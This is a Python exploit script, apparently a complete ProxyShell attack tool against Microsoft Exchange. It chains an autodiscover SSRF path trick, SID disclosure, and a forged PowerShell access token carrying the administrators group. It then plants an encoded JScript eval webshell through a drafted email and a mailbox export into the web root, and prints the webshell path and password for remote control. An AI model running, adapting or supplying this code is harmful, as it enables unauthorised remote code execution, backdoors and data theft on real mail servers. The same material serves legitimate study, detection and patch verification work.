import sys
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
import argparse
import base64
import struct
import re
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
import logging
import smtplib
import binascii
import time
import random
import uuid
import string
import six
from io import BytesIO

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

#proxy = {'http': 'http://192.168.67.147:8888', 'https': 'http://192.168.67.147:8888'}
proxy = None


def get_LegacyDN(target, email):

    headers = {"Content-Type": "text/xml",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36."
               }
    
    autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>%s</EMailAddress> 
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
    </Autodiscover>
    """ % email

    url = target + '/autodiscover/autodiscover.json?@test.com/autodiscover/autodiscover.xml?=&Email=autodiscover/autodiscover.json%3F@test.com'
    try:
        response = requests.post(url, headers=headers, data=autoDiscoverBody, proxies=proxy, verify=False)

        if response.status_code == 200 and "<LegacyDN>" in response.content.decode('utf8').strip():
            LegacyDN = response.content.decode('utf8').strip().split("<LegacyDN>")[1].split("</LegacyDN>")[0]
            print(Fore.LIGHTGREEN_EX + "[Step 1] " + Fore.RESET + "The LegacyDN was successfully obtained: \n\t", LegacyDN)
            return LegacyDN
            
        else:
            print("Failed to get LegacyDN")
            exit()
    except Exception as e:
        print(e)
        exit()

def get_sid(target, email, LegacyDN):
    headers = {"Content-Type": "application/mapi-http",
               "X-RequestId": "1337",
               "X-ClientApplication": "Outlook/15.00.0000.0000",
               "x-requesttype": "connect",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36."
               }
    
    mapi_body = LegacyDN + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

    url = target + '/autodiscover/autodiscover.json?@test.com/mapi/emsmdb/?=&Email=autodiscover/autodiscover.json%3F@test.com'
    try:
        response = requests.post(url, data=mapi_body, headers=headers, proxies=proxy, verify=False)
        if response.status_code == 200 and 'User SID' in response.content.decode('cp1252').strip():
            sid = response.content.decode('cp1252').strip().split("with SID ")[1].split(" and MasterAccountSid")[0]
            print(Fore.LIGHTGREEN_EX + "[Step 2] " + Fore.RESET + "Successfully obtained %s SID: \n\t%s" %(email, sid))
            return sid
        else:
            print("Failed to get SID")
    except Exception as e:
        print(e)
        exit()

def gen_token(email, sid):
        version = 0
        ttype = 'Windows'
        compressed = 0
        auth_type = 'Kerberos'
        raw_token = b''
        gsid = 'S-1-5-32-544'

        version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
        type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
        compress_data = b'C' + (compressed).to_bytes(1, 'little')
        auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
        login_data = b'L' + (len(email)).to_bytes(1, 'little') + email.encode()
        user_data = b'U' + (len(sid)).to_bytes(1, 'little') + sid.encode()
        group_data = b'G' + struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
        ext_data = b'E' + struct.pack('>I', 0)

        raw_token += version_data
        raw_token += type_data
        raw_token += compress_data
        raw_token += auth_data
        raw_token += login_data
        raw_token += user_data
        raw_token += group_data
        raw_token += ext_data

        data = base64.b64encode(raw_token).decode()
        print(Fore.LIGHTGREEN_EX + "[Step 3] " + Fore.RESET + f"The token value is calculated by SID: \n\t{data}")
        return data


def check_token(target, token):
    headers = {
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36."
               }
    url = target + '/autodiscover/autodiscover.json?@test.com/Powershell?X-Rps-CAT=%s&Email=autodiscover/autodiscover.json?@test.com' % token
    print(Fore.LIGHTGREEN_EX + "[Step 4] " + Fore.RESET + "Check if the token is valid...")
    try:
        response = requests.get(url, headers=headers, proxies=proxy, verify=False)
        if response.status_code == 200:
            print('\tthe token is valid !!')
        else:
            print("token invalid")
    except Exception as e:
        print(e)
        exit()

def generating_webshell_content():
    DWORD_SIZE = 4

    mpbbCrypt = [
        65, 54, 19, 98, 168, 33, 110, 187,
        244, 22, 204, 4, 127, 100, 232, 93,
        30, 242, 203, 42, 116, 197, 94, 53,
        210, 149, 71, 158, 150, 45, 154, 136,
        76, 125, 132, 63, 219, 172, 49, 182,
        72, 95, 246, 196, 216, 57, 139, 231,
        35, 59, 56, 142, 200, 193, 223, 37,
        177, 32, 165, 70, 96, 78, 156, 251,
        170, 211, 86, 81, 69, 124, 85, 0,
        7, 201, 43, 157, 133, 155, 9, 160,
        143, 173, 179, 15, 99, 171, 137, 75,
        215, 167, 21, 90, 113, 102, 66, 191,
        38, 74, 107, 152, 250, 234, 119, 83,
        178, 112, 5, 44, 253, 89, 58, 134,
        126, 206, 6, 235, 130, 120, 87, 199,
        141, 67, 175, 180, 28, 212, 91, 205,
        226, 233, 39, 79, 195, 8, 114, 128,
        207, 176, 239, 245, 40, 109, 190, 48,
        77, 52, 146, 213, 14, 60, 34, 50,
        229, 228, 249, 159, 194, 209, 10, 129,
        18, 225, 238, 145, 131, 118, 227, 151,
        230, 97, 138, 23, 121, 164, 183, 220,
        144, 122, 92, 140, 2, 166, 202, 105,
        222, 80, 26, 17, 147, 185, 82, 135,
        88, 252, 237, 29, 55, 73, 27, 106,
        224, 41, 51, 153, 189, 108, 217, 148,
        243, 64, 84, 111, 240, 198, 115, 184,
        214, 62, 101, 24, 68, 31, 221, 103,
        16, 241, 12, 25, 236, 174, 3, 161,
        20, 123, 169, 11, 255, 248, 163, 192,
        162, 1, 247, 46, 188, 36, 104, 117,
        13, 254, 186, 47, 181, 208, 218, 61,
        20, 83, 15, 86, 179, 200, 122, 156,
        235, 101, 72, 23, 22, 21, 159, 2,
        204, 84, 124, 131, 0, 13, 12, 11,
        162, 98, 168, 118, 219, 217, 237, 199,
        197, 164, 220, 172, 133, 116, 214, 208,
        167, 155, 174, 154, 150, 113, 102, 195,
        99, 153, 184, 221, 115, 146, 142, 132,
        125, 165, 94, 209, 93, 147, 177, 87,
        81, 80, 128, 137, 82, 148, 79, 78,
        10, 107, 188, 141, 127, 110, 71, 70,
        65, 64, 68, 1, 17, 203, 3, 63,
        247, 244, 225, 169, 143, 60, 58, 249,
        251, 240, 25, 48, 130, 9, 46, 201,
        157, 160, 134, 73, 238, 111, 77, 109,
        196, 45, 129, 52, 37, 135, 27, 136,
        170, 252, 6, 161, 18, 56, 253, 76,
        66, 114, 100, 19, 55, 36, 106, 117,
        119, 67, 255, 230, 180, 75, 54, 92,
        228, 216, 53, 61, 69, 185, 44, 236,
        183, 49, 43, 41, 7, 104, 163, 14,
        105, 123, 24, 158, 33, 57, 190, 40,
        26, 91, 120, 245, 35, 202, 42, 176,
        175, 62, 254, 4, 140, 231, 229, 152,
        50, 149, 211, 246, 74, 232, 166, 234,
        233, 243, 213, 47, 112, 32, 242, 31,
        5, 103, 173, 85, 16, 206, 205, 227,
        39, 59, 218, 186, 215, 194, 38, 212,
        145, 29, 210, 28, 34, 51, 248, 250,
        241, 90, 239, 207, 144, 182, 139, 181,
        189, 192, 191, 8, 151, 30, 108, 226,
        97, 224, 198, 193, 89, 171, 187, 88,
        222, 95, 223, 96, 121, 126, 178, 138,
        71, 241, 180, 230, 11, 106, 114, 72,
        133, 78, 158, 235, 226, 248, 148, 83,
        224, 187, 160, 2, 232, 90, 9, 171,
        219, 227, 186, 198, 124, 195, 16, 221,
        57, 5, 150, 48, 245, 55, 96, 130,
        140, 201, 19, 74, 107, 29, 243, 251,
        143, 38, 151, 202, 145, 23, 1, 196,
        50, 45, 110, 49, 149, 255, 217, 35,
        209, 0, 94, 121, 220, 68, 59, 26,
        40, 197, 97, 87, 32, 144, 61, 131,
        185, 67, 190, 103, 210, 70, 66, 118,
        192, 109, 91, 126, 178, 15, 22, 41,
        60, 169, 3, 84, 13, 218, 93, 223,
        246, 183, 199, 98, 205, 141, 6, 211,
        105, 92, 134, 214, 20, 247, 165, 102,
        117, 172, 177, 233, 69, 33, 112, 12,
        135, 159, 116, 164, 34, 76, 111, 191,
        31, 86, 170, 46, 179, 120, 51, 80,
        176, 163, 146, 188, 207, 25, 28, 167,
        99, 203, 30, 77, 62, 75, 27, 155,
        79, 231, 240, 238, 173, 58, 181, 89,
        4, 234, 64, 85, 37, 81, 229, 122,
        137, 56, 104, 82, 123, 252, 39, 174,
        215, 189, 250, 7, 244, 204, 142, 95,
        239, 53, 156, 132, 43, 21, 213, 119,
        52, 73, 182, 18, 10, 127, 113, 136,
        253, 157, 24, 65, 125, 147, 216, 88,
        44, 206, 254, 36, 175, 222, 184, 54,
        200, 161, 128, 166, 153, 152, 168, 47,
        14, 129, 101, 115, 228, 194, 162, 138,
        212, 225, 17, 208, 8, 139, 42, 242,
        237, 154, 100, 63, 193, 108, 249, 236
    ]

    mpbbR = mpbbCrypt
    mpbbS = mpbbCrypt[256:]
    mpbbI = mpbbCrypt[512:]

    def cryptpermute(data, encrypt=False):
        table = mpbbR if encrypt else mpbbI
        tmp = [table[v] for v in data] if six.PY3 else [table[ord(v)] for v in data]
        i = 0
        buf = bytes(tmp) if six.PY3 else bytearray(tmp)
        stream = BytesIO(buf)
        while True:
            b = stream.read(DWORD_SIZE)
            try:
                tmp[i] = b[0]
                tmp[i + 1] = b[1]
                tmp[i + 2] = b[2]
                tmp[i + 3] = b[3]
                i += DWORD_SIZE
            except:
                pass
            if len(b) != DWORD_SIZE:
                break

        return bytes(tmp) if six.PY3 else ''.join(tmp)

    webshell = b"<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>"
    
    v1 = cryptpermute(webshell, False)
    b64_data = base64.b64encode(v1).decode()
    return 'ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoI5uanf2jmp1mlU041pqRT/FIb32tld9wZUFLfTBjm5qd/aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ'
    # print("[+] Encode webshell ⬇\n{}\n".format(b64_data))

    # encode_shell = base64.b64decode(b64_data)
    # decode_shell = cryptpermute(encode_shell, True)
    # print("[+] Decode webshell ⬇\n{}\n".format(decode_shell.decode()))

def send_mail(target, email, webshell_content, sid, token):
    # 请求头
    headers = {
        "Cookie": "Email=autodiscover/autodiscover.json?a=test@test.com",
        "Content-Type": "text/xml",
    }
    url = target + "/autodiscover/autodiscover.json?a=test@test.com/EWS/exchange.asmx/?X-Rps-CAT=%s" % token
    print(Fore.LIGHTGREEN_EX + "[Step 5] " + Fore.RESET + "Start sending email ...")
    
    email_subject = str(uuid.uuid4())[:8] 
    attachment_name = 'FileAttachment.txt'
    mail_content = 'system'

    # SOAP 请求体
    payload = f"""<soap:Envelope
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
    xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Header>
        <t:RequestServerVersion Version="Exchange2016"/>
        <t:SerializedSecurityContext>
        <t:UserSid>{sid}</t:UserSid>
        <t:GroupSids>
            <t:GroupIdentifier>
            <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
            </t:GroupIdentifier>
        </t:GroupSids>
        </t:SerializedSecurityContext>
    </soap:Header>
    <soap:Body>
        <m:CreateItem MessageDisposition="SaveOnly">
        <m:Items>
            <t:Message>
            <t:Subject>{email_subject}</t:Subject>
            <t:Body BodyType="HTML">{mail_content}</t:Body>
            <t:Attachments>
                <t:FileAttachment>
                <t:Name>{attachment_name}</t:Name>
                <t:IsInline>false</t:IsInline>
                <t:IsContactPhoto>false</t:IsContactPhoto>
                <t:Content>{webshell_content}</t:Content>
                </t:FileAttachment>
            </t:Attachments>
            <t:ToRecipients>
                <t:Mailbox>
                <t:EmailAddress>{email}</t:EmailAddress>
                </t:Mailbox>
            </t:ToRecipients>
            </t:Message>
        </m:Items>
        </m:CreateItem>
    </soap:Body>
    </soap:Envelope>"""

    # 发起请求
    try:
        response = requests.post(url, headers=headers, data=payload, proxies=proxy, verify=False)
        if response.status_code == 200:
            print(f'\tThe email was sent successfully. Save in the {email} draft box\n\tEmail subject: \'{email_subject}\'; Receive email address: \'{email}\'')
            return email_subject
    except Exception as e:
        print(e)

def powershell_command(target, token, alias_name, subject, shellname):
    """
    尝试对目标执行 PowerShell 命令。
    """
    try:
        print(Fore.LIGHTGREEN_EX + "[Step 6] " + Fore.RESET + "Execute PowerShell commands on Exchange ...")
        url = target.replace('https://', '').replace('http://', '')
        # 配置 WSMan
        wsman = WSMan(
            server=url,
            port=443,
            path=f"/autodiscover/autodiscover.json?@test.com/Powershell?X-Rps-CAT={token}&Email=autodiscover/autodiscover.json%3F@test.com",
            ssl="true",  # 使用 HTTPS
            cert_validation=False,  # 忽略 SSL 验证
            proxies=proxy,  # 配置代理
        )

        print("\tWSMan connection initialized successfully.")

        # 清理之前的 Mailbox Export 请求
        print("\tCleaning up existing Mailbox Export Requests...")
        with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
            ps = PowerShell(pool)
            ps.add_script("Get-MailboxExportRequest | Remove-MailboxExportRequest -Confirm:$false")
            output = ps.invoke()
            if ps.had_errors:
                print("\tErrors during cleaning: ", ps.streams.error)
                return

        # 第一个 PowerShell 会话：角色分配
        print("\tStarting PowerShell session for Role Assignment...")
        with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
            ps = PowerShell(pool)
            ps.add_cmdlet("New-ManagementRoleAssignment")
            ps.add_parameter("Role", "Mailbox Import Export")
            ps.add_parameter("SecurityGroup", "Organization Management")
            output = ps.invoke()

            if ps.had_errors:
                print("\tErrors during Role Assignment: ", ps.streams.error)
                return

            print("\tRole Assignment Output: ", output)

        # 第二个 PowerShell 会话：Mailbox 导出请求
        print("\tStarting PowerShell session for Mailbox Export Request...")
        with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
            ps = PowerShell(pool)
            ps.add_cmdlet("New-MailboxExportRequest")
            ps.add_parameter("Mailbox", alias_name)
            ps.add_parameter("Name", subject)
            ps.add_parameter("ContentFilter", f"Subject -eq '{subject}'")
            ps.add_parameter("FilePath", f"\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\{shellname}")
            output = ps.invoke()

            if ps.had_errors:
                print("\tErrors during Mailbox Export Request: ", ps.streams.error)
                return
            
            if not output:
                print("\tMailbox Export Request output is empty. Request may have failed.")
                return  
            
            print("\tMailbox Export Request Output: ", output)

        webshell_path = f'{target}/aspnet_client/{shellname}'
        print("\tExploit completed successfully.")
        print(f'\tThe webshell \'{webshell_path}\' appears to have been generated successfully')

        print(Fore.LIGHTGREEN_EX + "[Step 7] " + Fore.RESET + "Checks if the webshell exists...")
        time.sleep(6)
        
        response = requests.get(url=webshell_path, verify=False, proxies=proxy)
        if response.status_code == 200:
            print('\twebshell exists, Good luck!! Please use AntSword to connect, webshell path: ', webshell_path, 'pass: cmd')
        elif response.status_code == 500:
            print('\twebshell exists, However, there are some issues and it cannot be accessed with a response code of 500. webshell path: ', webshell_path, 'pass: cmd')
        else:
            print('\twebshell doesn\'t exist. response code: ', response.status_code)
    
    except Exception as e:
        print("\tAn error occurred during execution: ", e)


def logo():
    logo0 = r'''  
                               
  ____                      ____  _          _ _ 
 |  _ \ _ __ _____  ___   _/ ___|| |__   ___| | |
 | |_) | '__/ _ \ \/ / | | \___ \| '_ \ / _ \ | |
 |  __/| | | (_) >  <| |_| |___) | | | |  __/ | |
 |_|   |_|  \___/_/\_\\__, |____/|_| |_|\___|_|_|
                      |___/                      

                                                  By Ly4j                                           
                                                            
'''
    print(logo0)

def main():
    if len(sys.argv) != 3:
        logo()
        print('exchange ProxyShell exploit tool')
        print("Usage: python3 proxyshell.py <url> <Exchange Administrator Email Address>")  
        sys.exit(1)  
    logo()
    target = sys.argv[1] 
    email = sys.argv[2] 
    LegacyDN = get_LegacyDN(target, email)
    sid = get_sid(target, email, LegacyDN)
    token = gen_token(email, sid)
    check_token(target, token)
    webshell_content = generating_webshell_content()
    email_subject = send_mail(target, email, webshell_content, sid, token)
    shellname = str(uuid.uuid4())[:8] + ".aspx"
    powershell_command(target, token, email, email_subject, shellname)

if __name__ == '__main__':
    main()